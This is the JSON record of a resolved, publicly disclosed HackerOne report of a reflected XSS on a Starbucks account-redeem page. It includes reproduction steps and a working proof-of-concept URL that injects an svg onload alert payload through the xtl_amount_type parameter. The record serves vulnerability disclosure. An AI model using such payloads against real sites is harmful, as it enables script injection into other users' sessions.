@@ -1,0 +1,168 @@
+{
+  "id": 531042,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzEwNDI=",
+  "url": "https://hackerone.com/reports/531042",
+  "title": "Reflected XSS in https://www.starbucks.com/account/create/redeem/MCP131XSR via xtl_amount, xtl_coupon_code, xtl_amount_type parameters",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-04-08T09:45:51.256Z",
+  "submitted_at": "2019-04-08T09:45:51.256Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zl33t",
+    "url": "/zl33t",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/aax3u16q3h3izlpgfxhyflgujrlu/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-11-13T20:24:51.176Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-10-18T10:17:40.649Z",
+  "team_member_agreed_on_going_public_at": "2019-11-13T20:24:51.080Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "HI,\n\n**Summary:** Reflected XSS \n**Description:**  the parameters are complementary to each other\n**Platform(s) Affected:**  my browser firefox 52.7.3\n\n## Steps To Reproduce:\n\n   1. go to https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=81431&xtl_amount=0.0&xtl_amount_type=DOLLAR_VALUE\n   1. change parameter `xtl_amount_type` to </script><svg/onload=alert()>` >note:if you  go enter this the payload not work but!!!!! you change `xtl_coupon_code` and `xtl_amount` payload will work\n   1. change `xtl_coupon_code` and `xtl_amount` to any think \n\n   1.payload be like https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=hkjhkjh&xtl_amount=jhkjhj&xtl_amount_type=ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E\n  \n## Supporting Material/References:\n\n {F464214}\n\n\n## How can the system be exploited with this bug?\n  \nThe attacker can execute JS code.\n\n## How did you come across this bug ?\nchange `xtl_coupon_code` and `xtl_amount` payload will work\nIn this bug the parameters are complementary to each other\n\n## Recommendations for fix\n\nIn this bug the parameters are complementary to each other try to retreat\n\n## Impact\n\n* The attacker can execute JS code.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 464214,
+      "file_name": "zayn_xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/464/214/c5b39e4ce361f0217a561bce2b01d1c0d0b38d47/zayn_xss.png?response-content-disposition=attachment%3B%20filename%3D%22zayn_xss.png%22%3B%20filename%2A%3DUTF-8%27%27zayn_xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DREO5IG%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T010921Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnneVoiheeVrYn06TOHU%2Fq2zgqOC8Sv%2BOKH%2FGAnshAIQIgAPAHqJZ7DjWF3X9HWktBOirApuw%2F19BKR3KmNLS6VgQquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBv%2BAORdmAf2qKtPgiqPBfdxFGQ4gh1bXu4t%2FwfazyZQBKebhdXFQjgNUe34tkbZp7l9aQIkk3VWFtfMyOlRK2oNwIrTg9J4Z%2BCt2N%2FvW0teeJli8qV0vL6ESaeQMlEGRk1WRO0VGr4Qm%2FLIaunnloSdG0lfCIhk1k0TaZAgkrXk9lZIExdoyaTVXMccsNbbWrtbxm8nygt7Gymot6aPm7Y4LoseFs5bzUHNGKkrQLW4PUETKdmhesy3fpKLnEbU4U%2BgvSpSDobTHI7i8q1O2Agsz%2FQ6CzzYW6L9L1JbCdpCABsdDQd5APZOGHGpYriaixGnInxfumF9pCNaq9CxkaK4dAN%2FsJCokmAOWSB8h0%2BDYSOT7UCnNrKNxSKlG0w6R28IL5gidAHNZp2PmCFAVmzz1uzVOX6ilobwTRoe4NgOYyCsIzvjJE6TIy724dBjGtCaxvrKSAFpcy4GYYglas2WUiGxouwm1p8qW6PUsylmixJ8fLdP9TYwGxbk529SnVz90zxdh694yXCbYZhzG8tl%2B3qD5e0%2B2UYl6vm43xclP7rNmGqm%2BTH0V0RjNpGK5Qb7eVpfncFdPI83k64pSZWRNB9JLvv9sUaGw2Hv9ppOCssA%2BpCaKzRhUBDm%2FSkAzi2K%2FHL9MEq7jYRSxbcD5IhaG0ICp3BV19tEyRYYNHGzyswUoKyl51kpKJSMrVOST4BiewjCEotNnSjWEdg7Jv3sBXGJNri2ypIv5%2BNx9SMbAYK6yewK4Iupt9AI%2B0qPD%2F6SyipUvMfjzZBP9haDbfjuJS5inj%2BDmRhXklnVfK4bqUdGo7LNs0k5cY9FrKlqh0H%2Fzt40AITSqW8SzQBHiVrWjEl38BWJe0ajrdqANQsvlH%2FiUIZ3KqzN0T7c9AowmOrjzAY6sQFduaBRItRS0p2ShadMPmvPjxVngd9AVFQNmslDCMNOSMGb%2F%2FR8SbjqnRtL7mkf7pTvwBcswAZUK2xu5IrpfCfZ98fxSJsaMWF8KqiFpmqDbuosWTTB38Rs0Hb4a2pKa1DMZUirIO5mzo6oTNIZvKbSdHMm2d0a0WPQhgZJlkfEB3AOZhnIzzJo%2FT3gKOZNgIc2I%2Bd6muGNebdM6Ly%2BhUnTqk9p9aKzPS6CclS6Ada8bxc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb813739203b18d77b1944c027a24b392d77b8974c9d63d923c76844fdf63987",
+      "file_size": 123868,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-11-17T10:17:40.698Z",
+  "allow_singular_disclosure_after": -197650300.75272867,
+  "singular_disclosure_allowed": true,
+  "vote_count": 42,
+  "voters": [
+    "kashsec",
+    "mashoud1122",
+    "hunter0x000",
+    "mr-k0anti",
+    "e4366eolywrgpidfbio",
+    "ahmd_halabi",
+    "mik317",
+    "sudi",
+    "yogesh_ojha",
+    "musab_alharany",
+    "and 32 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13020,
+    "asset_type": "URL",
+    "asset_identifier": "www.starbucks.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "id": 18873,
+      "category": "team",
+      "content": "zayn1337 discovered that the endpoint at https://www.starbucks.com/account/create/redeem/MCP131XSR was vulnerable to a reflected cross-site scripting vulnerability.\n\n@zayn1337 — thank you for uncovering this vulnerability, your patience while we followed up on the issue and for confirming the resolution.",
+      "updated_at": "2019-11-13T20:20:58.022Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 706273,
+        "username": "agedsumatra",
+        "name": "agedSumatra",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-08-12T17:50:49.926Z",
+        "url": "https://hackerone.com/agedsumatra",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
